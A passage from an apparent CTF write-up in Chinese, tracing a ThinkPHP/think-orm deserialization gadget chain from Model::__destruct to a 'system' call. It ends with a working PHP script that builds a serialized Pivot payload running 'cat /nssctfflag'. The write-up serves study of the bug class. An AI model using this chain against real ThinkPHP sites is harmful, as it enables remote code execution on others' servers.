<p><code>$this-&gt;table</code>可控，能够进入到if里，由于用了<code>.</code>来拼接<code>$this-&gt;table</code>和<code>$this-&gt;suffix</code>，也就是把这两个变量当做字符串来处理，倘若传入对象，则会触发<code>__toString()</code>，因此现在可以寻找<code>__toString()</code>了，在<code>www/vendor/topthink/think-orm/src/model/concern/Conversion.php</code>里的<code>__toString()</code>调用了<code>toJson()</code>，跟进调用了<code>toArray()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">...</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code> $data = array_merge($this-&gt;data, $this-&gt;relation);</code>这一句将两个数组合并，接下来遍历，中间用到<code>getAttr()</code>函数，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$relation</code>默认是false的，<code>$value</code>从<code>getData()</code>获取，然后传到<code>getValue()</code>，跟进<code>getData()</code>看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面调用的<code>getRealFieldName</code>跟利用链关系不大，看<code>getValue()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测属性获取器</span></span><br><span class="line">        <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;get)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;get[<span class="variable">$fieldName</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$method</span> = <span class="string">&#x27;get&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$name</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$relation</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;withAttr</code>存在于且为数组，<code>$fieldName</code>在<code>$this-&gt;json</code>中存在就能执行<code>getJsonValue</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$name</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc) &#123;</span><br><span class="line">            <span class="variable">$value</span>[<span class="variable">$key</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$key</span>], <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span>-&gt;<span class="variable">$key</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>-&gt;<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>变量覆盖RCE，控制<code>$this-&gt;jsonAssoc</code>为true即可利用</p>
<p>到这里整理一下链子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Conversion::__toString()</span><br><span class="line">Conversion::toJson()</span><br><span class="line">Conversion::toArray() //$this-&gt;data</span><br><span class="line">Attribute::getAttr()</span><br><span class="line">Attribute::getValue() //$this-&gt;json $this-&gt;withAttr</span><br><span class="line">Attribute::getJsonValue()</span><br></pre></td></tr></table></figure>

<p>data是可控的，如果控制data为<code>$this-&gt;data=[&#39;whoami&#39;=&gt;[&#39;whoami&#39;]]</code>，经过foreach传入<code>Attribute::getAttr()</code>，key就是whoami</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"><span class="comment">//$this-&gt;data=[&#x27;whoami&#x27;=&gt;[&#x27;whoami&#x27;]]</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">...</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$key=whoami</span></span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getAttr()</code>里用的是<code>getData()</code>来获取数组value的，刚才我们控制了data为键值对，<code>key</code>是<code>whoami</code>，值是<code>[&#39;whoami&#39;]</code>，最终<code>$value=[&#39;whoami&#39;]</code>，刚才说了<code>$this-&gt;withAttr</code>存在且为数组，<code>$fieldName</code>在<code>$this-&gt;json</code>中存在就能执行<code>getJsonValue</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$relation</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure>

<p>控制<code>$this-&gt;withAttr=[&#39;whoami&#39;=&gt;[&#39;system&#39;]]</code>，<code>$this-&gt;json=[&#39;whoami&#39;]</code>，进入最后的<code>getJsonValue()</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$name</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc) &#123;</span><br><span class="line">            <span class="variable">$value</span>[<span class="variable">$key</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$key</span>], <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span>-&gt;<span class="variable">$key</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>-&gt;<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$name=&#39;whaomi,$value=[&#39;whoami&#39;],$this-&gt;withAttr[$name]=[&#39;system&#39;]</code></p>
<p>poc构造的角度结束，来看exp构造(<code>__destruct()</code>利用过程)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Model::__destruct()</span><br><span class="line">Model::save()</span><br><span class="line">Model::updateData()</span><br><span class="line">Model::checkAllowFields()</span><br><span class="line">Model::db()  //__toString()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123; <span class="comment">//控制$this-&gt;lazySave=true</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123; <span class="comment">//$this-&gt;data非空即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>); <span class="comment">//控制$this-&gt;exists为true</span></span><br></pre></td></tr></table></figure>

<p>然后到<code>Model::db()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">        <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;table)) &#123;</span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">table</span>(<span class="variable">$this</span>-&gt;table . <span class="variable">$this</span>-&gt;suffix);</span><br><span class="line">        &#125;<span class="comment">//控制$this-&gt;talbe为实例化的对象当做字符串调用触发__toString()</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Model是抽象类，利用了我们涉及到的<code>Attribute</code>和<code>Conversion</code>接口，关键字可以直接使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>寻找一个可以被实例化的Model子类开始构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">true</span>;</span><br><span class="line"><span class="comment">//        private $data = [&#x27;whoami&#x27;=&gt;[&#x27;ls /&#x27;]];</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&#x27;whoami&#x27;</span>=&gt;[<span class="string">&#x27;cat /nssctfflag&#x27;</span>]];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&#x27;whoami&#x27;</span>=&gt;[<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>());</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在题目的Index.php中存在一个test路由，里面反序列化了post参数a，传入即可</p>
